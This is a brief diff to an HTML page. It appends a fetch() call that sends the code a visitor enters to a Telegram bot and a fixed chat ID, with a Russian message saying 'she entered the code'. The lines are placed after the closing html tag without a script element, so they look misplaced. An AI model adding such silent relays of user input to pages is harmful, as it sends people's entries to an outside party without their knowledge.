@@ -69,3 +69,13 @@ function checkCode() {
 
 </body>
 </html>
+fetch("https://api.telegram.org/botTOKEN/sendMessage", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    chat_id: "531516216",
+    text: "Она ввела код: " + code
+  })
+});
